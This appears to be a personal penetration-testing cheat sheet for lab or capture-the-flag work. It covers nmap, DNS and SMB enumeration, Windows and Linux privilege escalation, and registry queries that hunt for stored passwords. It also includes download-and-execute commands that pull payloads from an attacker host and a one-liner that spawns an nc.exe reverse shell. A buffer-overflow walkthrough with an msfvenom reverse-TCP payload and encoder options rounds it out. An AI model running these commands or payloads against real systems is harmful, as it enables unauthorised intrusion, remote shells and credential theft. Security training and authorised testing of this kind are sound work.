# Basic Steps

[Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)

[https://book.hacktricks.xyz/](a lot of good stuff)

## Automatic web enum
- dirb | dirsearch
- linpeas
- wpsscan -U user -P password
- [crackmapexec](https://www.crackmapexec.wiki/)

## Basic network
- nmap (all ports)
  - script: locate -r nse$ | grep NAME
  - sudo nmap -p- -Pn -sS TARGET -oA AllPort
  - sudo nmap -p -Pn -A 10.10.43.161 -oA Services
  - sudo nmap -Pn -sV -sS -p --script vuln $target -oN Vuln.txt
    - -v Version
    - -A os, in-build scripts
    - -sC default scripts

  - scripts
    -   --script=nfs-ls,nfs-statfs,nfs-showmount
    -   --script=smb-enum-shares.nse,smb-enum-users.nse

    -  ports=$(sudo nmap -Pn -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $ports

### DNS
- Port 53 UDP/TCP
  - -sU UDP
  - TCP: zone transfer
  - add entry to etc/hosts
    -  echo "$target      domain" | sudo tee -a /etc/hosts
 - remove entry
  -  sudo sed -i "/$target      domain/d" /etc/hosts
  
- dig $target +short
  - dig $target -t RECORD +short
  - dig axfr domain @ATTACKING
- host $target
  - host -t ns $target
  
#### Find domains
- dnsenum
- nmap
  -  nmap -T4 -p53 --script dns* $target
- fierce --domain domain
- dnsrecon -d DOMAIN -std
- wfuzz -c -w WORDLIST -u "http://$target/" -H "Host: FUZZ.$target" -f output.txt --hw (hide word/line/etc)


## Login
- brute force: hydra
- sqlmap

## Windows
- [Good advices](https://nored0x.github.io/red-teaming/windows-enumeration/)
- whoami /priv
- systeminfo
  - architecture 
    - [Environment]::Is64BitProcess
    - [Environment]::Is32itProcess
- Impackt
  - /opt/impacket/e
- browser cache
- Enumerate register
- scheduled task
- UAC
- Check loggings
  - sysmon enable / powershell loggging enabled ?
- echo %VARIABLE%
  - PATH $Env:PATH
- Unquoted services:
  - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows
- Permissions:
  - icalcs
- eventvwr
- RCE admin: change user
- **Automatic scans**
  - winpeas
  - [privesc_check](https://github.com/pentestmonkey/windows-privesc-check)
  - [powerup](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
  - [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
  - Empire modules:  /usr/share/powershell-empire/empire/server/modules/

  
### Registry
- Passwords:
  - REG QUERY HKLM /F "password" /t REG_SZ /S /K
  - REG QUERY HKCU /F "password" /t REG_SZ /S /K
  - REG QUERY HKLM /F "password" /t REG_SZ /S /d
  - REG QUERY HKCU /F "password" /t REG_SZ /S /d
  - REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64


### SMB
- smbmap -H $target = Check Privileges 
- smbmap -H $target -R --depth 5
- smbclient -L //$target/ = List Shares
- smbclient //$target/Users = Interactive shell to a share 
- smbclient  \\\\$target\\share$ = Open a Null Session
- smbclient //friendzone.htb/general -U "" = see files inside
- smbclient -N -L //$target/ = List Shares as Null User
- smbmap -u Administrator -p 'Password@1' -H $target
- smbclient -U 'administrator%Password@1' \\\\\$target\\c$
- Nmap scripts
  - smb-enum-users.nse
  - smb-os-discovery
  - smb-protocols
  - smb-enum-shares
  - smb-vuln*

## Linux
- sudo -l
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -perm -04000 -ls 2>/dev/null : SUID

- lscpu
- lsblk -a
- lsusb -v
- lspci -t -v
- fidlist -l
- Groups: LXD????
- crontab
- Automatic tools
  - LinEnum.sh 
  - LinPeas
  - psexec.py
  
- Shell stabilize
  - python3 -c 'import pty;pty.spawn("/bin/bash")'
  - python3 -c  import pty;pty.spawn('/bin/bash') 
  - python -c 'import pty; pty.spawn("/bin/bash")'
  - export TERM=xterm

## Web
- cgi-bin = content
  - Apache!!!!
- ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt
- dirb http://$target -x Extensions (.pl .cgi .sh .ps1)

## Upload files
### Windows
- powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
- powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
- certutil -urlcache -f http://$attacking:80/nc.exe nc.exe
- iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 

### Linux
- wget attacker-machine:8000:file.ext
- curl attacker-machine:8000:file.ext

# Buffer overflow
- Upload file on Immunity Debugger (windows)
  
```
# Define working folder
!mona config -set workingfolder c:\Users\admin\Desktop\patota

# Fuzzing
python3 -c 'print("A" * 5000)'

# Generate payload after fuzzing
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l TOTAL

# send created pattern through script
python script.py

# Find Offset with mona
!mona findmsp -distance TOTAL

# Finf offset with metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP
```

- Write BBBB on "retn"

```
while bad_chars
  !mona bytearray -b "\x00" = remove bad chars | !mona bytearray -cpb "\x00" = remove bad chars
  strings.py = without bad chars
  !mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin -a ESP-Address

!mona jmp -r esp -cpb "Badchars"
```

- Copy address and write it backwards
- Add padding: "\x90" * 16
- Shell code msfvenom without bad chars

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c
```
## Convert python
dos2unix file

## Pictures
- strings
- exiftool
- 
## Payloads
- msfvenom - reverse -f aspx -o app.aspx
- -e x86/shikata_ga_nai
- windows/shell_reverse_tcp 

### Kerberos
- Enumerate
  - setspn -T medin -Q ​ */* = extract accounts from Service Principal Name

